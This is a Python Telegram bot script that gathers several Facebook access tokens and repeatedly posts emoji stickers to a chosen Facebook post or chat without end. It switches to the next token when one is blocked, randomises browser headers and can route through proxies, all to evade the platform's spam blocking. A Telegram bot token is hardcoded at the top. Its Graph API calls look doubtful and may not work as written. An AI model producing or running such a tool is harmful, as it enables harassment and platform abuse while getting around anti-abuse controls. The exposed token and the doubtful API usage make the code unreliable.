import requests
import threading
import logging
import random
import time
from telegram import Update
from telegram.ext import Application, CommandHandler, MessageHandler, filters, ConversationHandler, ContextTypes

# Telegram Bot Token
TELEGRAM_BOT_TOKEN = "7635741820:AAGAks8tA7qTJb5W6lSOpE1uMqG2Y9POvdg"

# Logging setup
logging.basicConfig(format="%(asctime)s - %(levelname)s - %(message)s", level=logging.INFO)

# Conversation states
TOKEN_COUNT, GET_TOKENS, CHAT_ID, DELAY, TEXT_TO_STICKER = range(5)

# Global variables
is_sending_active = True
PROXIES = [None]  # Add proxy if needed

# Sticker List based on message
STICKER_MAPPING = {
    "happy": "https://static.xx.fbcdn.net/images/emoji.php/v9/t0f/1/16/1f60d.png",  # Smiling Face with Heart-Eyes
    "sad": "https://static.xx.fbcdn.net/images/emoji.php/v9/t0f/1/16/1f622.png",    # Crying Face
    "love": "https://static.xx.fbcdn.net/images/emoji.php/v9/t0f/1/16/1f60d.png",   # Heart Eyes
    "angry": "https://static.xx.fbcdn.net/images/emoji.php/v9/t0f/1/16/1f620.png",  # Angry Face
    "celebrate": "https://static.xx.fbcdn.net/images/emoji.php/v9/t0f/1/16/1f389.png",  # Party Popper
    "thumbs up": "https://static.xx.fbcdn.net/images/emoji.php/v9/t0f/1/16/1f44d.png"  # Thumbs Up
}

def get_random_headers():
    return {
        "User-Agent": random.choice([
            "Mozilla/5.0 (Windows NT 10.0; Win64; x64)",
            "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7)",
            "Mozilla/5.0 (Linux; Android 10; SM-G975F)"
        ]),
        "Accept-Language": random.choice(["en-US,en;q=0.9", "en-GB,en;q=0.8"]),
        "Accept-Encoding": "gzip, deflate, br",
        "Connection": "keep-alive"
    }

def get_random_proxy():
    return {"http": random.choice(PROXIES), "https": random.choice(PROXIES)}

def send_facebook_sticker(access_token, chat_id, sticker_url):
    url = f"https://graph.facebook.com/v15.0/t_{chat_id}/"
    headers = get_random_headers()
    payload = {"access_token": access_token, "attachment_url": sticker_url}

    response = requests.post(url, json=payload, headers=headers, proxies=get_random_proxy())

    if response.status_code == 200:
        return True
    elif response.status_code in [403, 400]:  # Token blocked or expired
        logging.warning(f"⚠ Token blocked: {access_token[:10]}... Switching!")
        return False
    return False

async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
    global is_sending_active
    is_sending_active = True
    await update.message.reply_text("🤖 How many Facebook tokens do you want to use?")
    return TOKEN_COUNT

async def stop(update: Update, context: ContextTypes.DEFAULT_TYPE):
    global is_sending_active
    is_sending_active = False
    await update.message.reply_text("🛑 Stopping sticker sending.")
    return ConversationHandler.END

async def get_token_count(update: Update, context: ContextTypes.DEFAULT_TYPE):
    try:
        token_count = int(update.message.text)
        if token_count < 1:
            raise ValueError
        context.user_data["token_count"] = token_count
        context.user_data["tokens"] = []
        await update.message.reply_text(f"✅ Send {token_count} tokens one by one.")
        return GET_TOKENS
    except ValueError:
        await update.message.reply_text("❌ Enter a valid number (1 or more).")
        return TOKEN_COUNT

async def get_tokens(update: Update, context: ContextTypes.DEFAULT_TYPE):
    context.user_data["tokens"].append(update.message.text)

    if len(context.user_data["tokens"]) < context.user_data["token_count"]:
        await update.message.reply_text(f"✅ Token {len(context.user_data['tokens'])} saved. Send the next one.")
        return GET_TOKENS
    
    await update.message.reply_text("✅ All tokens saved! Now enter the **Facebook Post URL**:")
    return CHAT_ID

async def get_chat_id(update: Update, context: ContextTypes.DEFAULT_TYPE):
    context.user_data["chat_id"] = update.message.text
    await update.message.reply_text("✅ Post URL saved! Now enter the **Time Delay (in seconds)** between sticker posts:")
    return DELAY

async def get_delay(update: Update, context: ContextTypes.DEFAULT_TYPE):
    try:
        delay = int(update.message.text)
        if delay <= 0:
            raise ValueError
        context.user_data["delay"] = delay
        await update.message.reply_text("✅ Time delay saved! Now send the message (e.g., happy, sad) to get a sticker.")
        return TEXT_TO_STICKER
    except ValueError:
        await update.message.reply_text("❌ Enter a valid number (greater than 0).")
        return DELAY

async def send_message(update: Update, context: ContextTypes.DEFAULT_TYPE):
    global is_sending_active

    tokens = context.user_data.get("tokens", [])
    chat_id = context.user_data.get("chat_id")
    delay = context.user_data.get("delay")

    if not tokens or not chat_id or not delay:
        await update.message.reply_text("❌ Missing token, chat URL, or delay information.")
        return

    message = update.message.text.lower()  # Convert to lowercase to match the keys

    # Check if the message matches a predefined sticker
    selected_sticker = STICKER_MAPPING.get(message, None)
    
    if selected_sticker is None:
        await update.message.reply_text("❌ No matching sticker found for the message.")
        return

    def send_sticker():
        while is_sending_active:
            for i, token in enumerate(tokens):
                if not is_sending_active:
                    return

                success = send_facebook_sticker(token, chat_id, selected_sticker)

                if success:
                    logging.info(f"✅ Sent Sticker: {selected_sticker} (Token {i + 1})")
                else:
                    logging.error(f"❌ Failed (Token {i + 1}), switching token")

                time.sleep(delay)  # Adding time delay between posts

    threading.Thread(target=send_sticker, daemon=True).start()

    await update.message.reply_text(f"🚀 Sticker is being sent with a delay of {delay} seconds!")

def main():
    app = Application.builder().token(TELEGRAM_BOT_TOKEN).build()

    conv_handler = ConversationHandler(
        entry_points=[CommandHandler("start", start)],
        states={
            TOKEN_COUNT: [MessageHandler(filters.TEXT & ~filters.COMMAND, get_token_count)],
            GET_TOKENS: [MessageHandler(filters.TEXT & ~filters.COMMAND, get_tokens)],
            CHAT_ID: [MessageHandler(filters.TEXT & ~filters.COMMAND, get_chat_id)],
            DELAY: [MessageHandler(filters.TEXT & ~filters.COMMAND, get_delay)],
            TEXT_TO_STICKER: [MessageHandler(filters.TEXT & ~filters.COMMAND, send_message)],
        },
        fallbacks=[]
    )

    app.add_handler(conv_handler)
    app.add_handler(CommandHandler("stop", stop))

    app.run_polling()

if __name__ == "__main__":
    main()
